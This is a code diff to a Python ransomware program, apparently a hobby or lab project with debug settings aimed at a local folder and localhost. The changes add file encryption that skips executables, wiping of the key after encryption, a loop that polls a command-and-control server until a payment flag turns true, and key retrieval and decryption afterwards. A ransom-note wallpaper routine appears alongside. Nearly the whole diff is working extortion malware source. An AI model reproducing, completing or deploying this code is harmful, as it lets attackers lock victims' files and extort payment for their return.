@@ -7,10 +7,12 @@ import datetime  # Handling time-related data
 import os, sys  # For system-related data handling (hostname/usernames)
 import base64, pathlib
 import ctypes
+from time import sleep
 
 # Debug variables
 c2_url = "http://localhost:5000"
 target_paths = [".\\toencrypt"]
+exclude_types = (".exe", ".mobi")
 
 
 class Ransomware:
@@ -87,15 +89,18 @@ class Ransomware:
                 # Check if each path actually exists
                 if pathlib.Path(location).exists():
                     for path, subdirs, files in os.walk(location):
+                        files = [fi for fi in files if not fi.endswith(exclude_types)]
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.encrypt_file(filepath)
                             print(f"Encrypted: {filepath}  -->  {filepath}.rnsm")
             except Exception as e:
                 print(f"Error during file encryption loop: {e}")
+            self.encryption_key = None
+            self.box = None
 
     def decrypt_file(self, filepath):
-        """Decrypt files"""
+        """Takes a file path input and decrypts it using the box object of the Ransomware object"""
         try:
             if not os.path.isdir(filepath):
                 # Take the encrypted binary input of the file...
@@ -107,8 +112,24 @@ class Ransomware:
                 filepath = filepath.replace(".rnsm", "")
                 with open(f"{filepath}", "wb") as original_file:
                     original_file.write(original_data)
+                # Lastly, remove the encrypted file.
+                os.remove(f"{filepath}.rnsm")
         except Exception as e:
             print(f"Error during file encryption: {e}")
+
+    def start_decryption(self):
+        for location in target_paths:
+            try:
+                # Check if each path actually exists
+                if pathlib.Path(location).exists():
+                    for path, subdirs, files in os.walk(location):
+                        files = [fi for fi in files if fi.endswith(".rnsm")]
+                        for name in files:
+                            filepath = os.path.join(path, name)
+                            self.decrypt_file(filepath)
+                            print(f"Decrypted: {filepath}.rnsm  -->  {filepath}")
+            except Exception as e:
+                print(f"Error during file decryption loop: {e}")
 
     def change_wallpaper(self):
         "Change the victim's wallpaper to display our ransom note"
@@ -119,31 +140,31 @@ class Ransomware:
     def fear_and_loathing(self):
         self.change_wallpaper()
 
-    def sync(self):
-        """Periodically ask for current status on the server side"""
-        payload = {
-            "victim-id": (None, self.victim_id),
-        }
-        response = httpx.post(f"{c2_url}/sync", files=payload)
+    def setup_decryption(self):
+        """Setup the PyNaCL box again, so that decryption can take place"""
+        response = httpx.post(f"{c2_url}/check/{self.victim_id}")
+        self.encryption_key = response.headers["Victim-Key"]
+        bin_key = base64.b64decode(self.encryption_key)
+        self.box = nacl.secret.SecretBox(bin_key)
 
 
 def main():
     rnsm = Ransomware()
-    if rnsm.check_for_infection():
-        print("Already infected, waiting...")
-        return
-    else:
-        print("No infection found, continuing installing...")
     rnsm.create_remote_entry()
     rnsm.set_env_variables()
-    if rnsm.check_for_infection():
-        print("Already infected, waiting...")
-    else:
-        print("No infection found, continuing installing...")
     rnsm.start_encryption()
     rnsm.fear_and_loathing()
-
-    print(rnsm)
+    print("💲💲💲 Starting loop to check for payment receival...")
+    while (
+        httpx.post(f"{c2_url}/check/{rnsm.victim_id}").headers["Payment-Received"]
+        == "False"
+    ):
+        sleep(5)
+        print("😴 Syncing...")
+    print("✔✔✔ Payment was received!")
+    rnsm.setup_decryption()
+    rnsm.start_decryption()
+    print("🍾🍾🍾 You are all done, all files are now decrypted!")
 
 
 if __name__ == "__main__":
